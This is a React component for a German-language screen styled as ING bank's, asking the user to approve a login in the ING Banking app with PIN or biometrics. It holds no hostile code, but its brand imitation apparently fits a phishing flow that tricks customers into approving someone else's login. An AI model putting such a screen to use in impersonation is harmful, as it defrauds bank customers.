import React from 'react';

interface AppApprovalScreenProps {
  onContinue: () => void;
}

const AppApprovalScreen: React.FC<AppApprovalScreenProps> = ({ onContinue }) => {
  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '60vh',
      padding: '40px 20px'
    }}>
      <div className="ing-card" style={{ 
        padding: '40px',
        textAlign: 'center',
        maxWidth: '600px',
        width: '100%'
      }}>
        <div className="app-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-4.2-5.78v1.75l2.81-2.62c.21-.2.21-.53 0-.73L12.8 9v1.7c-3.11.43-4.35 2.56-4.8 4.7 1.11-1.5 2.58-2.18 4.8-2.18z"/>
          </svg>
        </div>
        
        <h2 className="heading--m">App-Freigabe erforderlich</h2>
        
        <p style={{
          fontSize: '16px',
          color: '#666',
          lineHeight: '1.5',
          marginBottom: '30px',
          fontFamily: 'ING Me, Arial, sans-serif'
        }}>
          Bitte geben Sie Ihren Login in der ING-App frei, um fortzufahren.
          Dies ist eine zusätzliche Sicherheitsmaßnahme zum Schutz Ihres Kontos.
        </p>
        
        <div style={{
          textAlign: 'left',
          marginBottom: '30px',
          background: '#f8f9fa',
          padding: '20px',
          borderRadius: '8px'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
            <div style={{
              width: '30px',
              height: '30px',
              background: '#ff6200',
              color: 'white',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginRight: '15px',
              fontSize: '14px',
              fontWeight: 'bold'
            }}>1</div>
            <div>
              Öffnen Sie Ihre <strong>ING Banking App</strong> auf Ihrem Smartphone
            </div>
          </div>
          
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
            <div style={{
              width: '30px',
              height: '30px',
              background: '#ff6200',
              color: 'white',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginRight: '15px',
              fontSize: '14px',
              fontWeight: 'bold'
            }}>2</div>
            <div>
              Tippen Sie auf die <strong>Freigabe-Benachrichtigung</strong> in Ihrer App
            </div>
          </div>
          
          <div style={{ display: 'flex', alignItems: 'center' }}>
            <div style={{
              width: '30px',
              height: '30px',
              background: '#ff6200',
              color: 'white',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginRight: '15px',
              fontSize: '14px',
              fontWeight: 'bold'
            }}>3</div>
            <div>
              Bestätigen Sie die Anmeldung mit Ihrer <strong>App-PIN</strong> oder <strong>Biometrie</strong>
            </div>
          </div>
        </div>
        
        <button 
          className="button button--primary" 
          onClick={onContinue}
          style={{ width: '100%', maxWidth: '300px' }}
        >
          Weiter
        </button>
      </div>
    </div>
  );
};

export default AppApprovalScreen;
